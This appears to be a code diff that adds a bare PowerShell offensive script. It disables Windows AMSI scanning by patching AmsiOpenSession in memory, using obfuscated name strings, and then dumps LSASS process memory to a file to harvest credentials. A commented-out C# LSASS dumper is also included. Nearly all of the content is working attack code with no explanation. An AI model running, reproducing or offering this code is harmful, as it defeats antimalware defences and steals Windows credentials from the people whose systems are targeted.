@@ -1,0 +1,73 @@
+function LookupFunc(){
+    Param ($moduleName, $methodName)
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp = @()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetModuleHandle") {$tmp +=$_}}
+    $GetModuleHandle = $tmp[0]
+    $user32 = $GetModuleHandle.Invoke($null, $moduleName)
+    $tmp = @()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp +=$_}}
+    $GetProcAddress = $tmp[0]
+    $params = @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $user32)), $methodName)
+    try {
+        return $GetProcAddress.Invoke($null,$params)
+    } catch {
+        return $GetProcAddress.Invoke($null,@($user32, $methodName))
+    }
+}
+
+function getDelegateType {
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+        [Parameter(Position = 1)] [Type] $delType = [Void]
+    )
+    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+    return $type.CreateType()
+}
+
+$name1 = "a" + "msi" + ".dll"
+$name2 = "A" + "msi" + "OpenS" + "ession"
+[IntPtr]$funcAddr = LookupFunc $name1 $name2
+
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32],[UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+$buf = [Byte[]] (0x48, 0x31, 0xC0)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
+$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
+
+<#
+[DllImport("Dbghelp.dll")]
+static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
+
+[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+static void Main(string[] args)
+{
+    FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", FileMode.Create);
+    Process[] lsass = Process.GetProcessesByName("lsass");
+    int lsass_pid = lsass[0].Id;
+
+    IntPtr hProcess = OpenProcess(0x001F0FFF, false, lsass_pid);
+    bool dumped = MiniDumpWriteDump(hProcess, lsass_pid, dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+}
+#>
+
+$ProcessDumpPath = "c:\windows\tracing\lsass.dmp"
+$Process = Get-Process "lsass"
+$ProcessId = $Process.Id
+$ProcessName = $Process.Name
+$ProcessHandle = $Process.Handle
+
+$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
+$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
+$Flags = [Reflection.BindingFlags] 'NonPublic, Static'
+$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
+$MiniDumpWithFullMemory = [UInt32] 2
+
+$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)
+$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle, $ProcessId, $FileStream.SafeFileHandle, $MiniDumpWithFullMemory, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero))
+$FileStream.Close()
